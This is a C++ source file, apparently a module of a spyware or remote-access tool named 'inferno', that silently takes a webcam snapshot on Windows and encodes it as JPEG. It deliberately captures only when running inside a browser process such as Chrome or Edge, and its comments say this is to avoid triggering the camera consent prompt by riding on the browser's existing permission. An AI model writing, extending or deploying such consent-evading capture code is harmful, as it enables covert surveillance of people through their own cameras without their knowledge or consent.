#include "../include/CameraCapture.hpp"
#include "../include/ScreenCapture.hpp"

#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <ole2.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>

#include <cstdio>

namespace inferno { namespace capture {

namespace {

// ── Browser process detection ──────────────────────────────────
// Only capture camera if running inside a known browser process,
// since browsers typically have camera permission already granted.

static bool isInsideBrowser() {
    wchar_t path[MAX_PATH];
    if (::GetModuleFileNameW(nullptr, path, MAX_PATH) == 0)
        return false;

    // Extract the filename portion (after last backslash)
    wchar_t* fname = wcsrchr(path, L'\\');
    fname = fname ? fname + 1 : path;

    for (size_t i = 0; fname[i]; ++i)
        fname[i] = static_cast<wchar_t>(::towlower(fname[i]));

    const wchar_t* browsers[] = {
        L"chrome.exe", L"msedge.exe", L"firefox.exe",
        L"opera.exe", L"brave.exe", L"vivaldi.exe"
    };
    for (const auto* name : browsers) {
        if (wcscmp(fname, name) == 0) return true;
    }
    return false;
}

// ── One-time Media Foundation initializer ──────────────────────

static bool ensureMf() {
    static bool initialized = false;
    if (initialized) return true;
    if (SUCCEEDED(::MFStartup(MF_VERSION, MFSTARTUP_NOSOCKET))) {
        initialized = true;
        return true;
    }
    return false;
}

} // anonymous namespace

// ── NV12 → BGRA conversion (software) ─────────────────────────

void nv12ToBgra(const uint8_t* y_plane, const uint8_t* uv_plane,
                int width, int height, int y_pitch, int uv_pitch,
                std::vector<uint8_t>& bgra) {
    bgra.resize(static_cast<size_t>(width) * height * 4);
    for (int y = 0; y < height; ++y) {
        for (int x = 0; x < width; ++x) {
            int yi = y * y_pitch + x;
            int ui = (y / 2) * uv_pitch + (x / 2) * 2;
            int vi = ui + 1;

            int y_val = y_plane[yi];
            int u_val = uv_plane[ui] - 128;
            int v_val = uv_plane[vi] - 128;

            int r = static_cast<int>(y_val + 1.402f * v_val);
            int g = static_cast<int>(y_val - 0.344f * u_val - 0.714f * v_val);
            int b = static_cast<int>(y_val + 1.772f * u_val);

            auto clamp = [](int v) -> uint8_t {
                return static_cast<uint8_t>(
                    v < 0 ? 0 : (v > 255 ? 255 : v));
            };

            size_t off = (static_cast<size_t>(y) * width + x) * 4;
            bgra[off]     = clamp(b);  // B
            bgra[off + 1] = clamp(g);  // G
            bgra[off + 2] = clamp(r);  // R
            bgra[off + 3] = 255;       // A
        }
    }
}

// ── Public API ─────────────────────────────────────────────────

CameraResult captureCamera(int width, int height) {
    CameraResult result;

    if (!isInsideBrowser()) {
        result.error_msg = "not running inside a known browser — "
                           "camera consent prompt would be triggered";
        return result;
    }

    if (!ensureMf()) {
        result.error_msg = "MFStartup failed";
        return result;
    }

    HRESULT hr = S_OK;

    // Enumerate video capture devices
    IMFAttributes* attributes = nullptr;
    hr = ::MFCreateAttributes(&attributes, 1);
    if (SUCCEEDED(hr))
        hr = attributes->SetGUID(
            MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
            MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);

    IMFActivate** devices = nullptr;
    UINT32 deviceCount = 0;
    if (SUCCEEDED(hr))
        hr = ::MFEnumDeviceSources(attributes, &devices, &deviceCount);

    if (FAILED(hr) || deviceCount == 0) {
        if (attributes) attributes->Release();
        result.error_msg = "no video capture devices found";
        return result;
    }

    // Create media source from first device
    IMFMediaSource* source = nullptr;
    hr = devices[0]->ActivateObject(IID_PPV_ARGS(&source));

    // Cleanup device list
    for (UINT32 i = 0; i < deviceCount; ++i)
        devices[i]->Release();
    ::CoTaskMemFree(devices);
    attributes->Release();

    if (FAILED(hr) || !source) {
        result.error_msg = "failed to activate camera device";
        return result;
    }

    // Create source reader
    IMFSourceReader* reader = nullptr;
    hr = ::MFCreateSourceReaderFromMediaSource(source, nullptr, &reader);
    source->Release();

    if (FAILED(hr)) {
        result.error_msg = "MFCreateSourceReaderFromMediaSource failed";
        return result;
    }

    // Set desired output format (NV12, then convert to BGRA)
    IMFMediaType* nativeType = nullptr;
    hr = reader->GetNativeMediaType(
        static_cast<DWORD>(MF_SOURCE_READER_FIRST_VIDEO_STREAM), 0,
        &nativeType);

    UINT32 cam_w = 0, cam_h = 0;
    if (SUCCEEDED(hr)) {
        MFGetAttributeSize(nativeType, MF_MT_FRAME_SIZE, &cam_w, &cam_h);
        nativeType->Release();
    }
    if (cam_w == 0 || cam_h == 0) {
        cam_w = static_cast<UINT32>(width);
        cam_h = static_cast<UINT32>(height);
    }

    IMFMediaType* outType = nullptr;
    hr = ::MFCreateMediaType(&outType);
    if (SUCCEEDED(hr))
        hr = outType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
    if (SUCCEEDED(hr))
        hr = outType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_NV12);
    if (SUCCEEDED(hr))
        hr = MFSetAttributeSize(outType, MF_MT_FRAME_SIZE, cam_w, cam_h);

    if (SUCCEEDED(hr))
        hr = reader->SetCurrentMediaType(
            static_cast<DWORD>(MF_SOURCE_READER_FIRST_VIDEO_STREAM),
            nullptr, outType);

    if (outType) outType->Release();

    if (FAILED(hr)) {
        reader->Release();
        result.error_msg = "failed to set camera media type";
        return result;
    }

    // Read a single frame
    DWORD streamFlags = 0;
    IMFSample* sample = nullptr;
    hr = reader->ReadSample(
        static_cast<DWORD>(MF_SOURCE_READER_FIRST_VIDEO_STREAM),
        0, nullptr, &streamFlags, nullptr, &sample);

    bool frameGrabbed = false;
    if (SUCCEEDED(hr) && sample && !(streamFlags & MF_SOURCE_READERF_ERROR)) {
        IMFMediaBuffer* buffer = nullptr;
        hr = sample->ConvertToContiguousBuffer(&buffer);
        if (SUCCEEDED(hr)) {
            BYTE* data = nullptr;
            DWORD bufLen = 0;
            hr = buffer->Lock(&data, nullptr, &bufLen);
            if (SUCCEEDED(hr) && data && bufLen > 0) {
                // NV12 layout: Y plane (cam_w x cam_h) followed by UV
                int y_pitch = static_cast<int>(cam_w);
                int uv_pitch = static_cast<int>(cam_w);

                const uint8_t* y_plane = data;
                const uint8_t* uv_plane = data +
                    static_cast<size_t>(y_pitch) * cam_h;

                std::vector<uint8_t> bgra;
                nv12ToBgra(y_plane, uv_plane,
                           static_cast<int>(cam_w),
                           static_cast<int>(cam_h),
                           y_pitch, uv_pitch, bgra);

                result.jpeg_data = encodeJpeg(bgra.data(),
                                               static_cast<int>(cam_w),
                                               static_cast<int>(cam_h),
                                               85, false);
                if (!result.jpeg_data.empty()) {
                    result.success = true;
                    result.width = static_cast<int>(cam_w);
                    result.height = static_cast<int>(cam_h);
                    frameGrabbed = true;
                }
                buffer->Unlock();
            }
            buffer->Release();
        }
        sample->Release();
    }

    reader->Release();

    if (!frameGrabbed) {
        result.error_msg = "failed to read camera frame";
    }
    return result;
}

}} // namespace inferno::capture

#endif // _WIN32
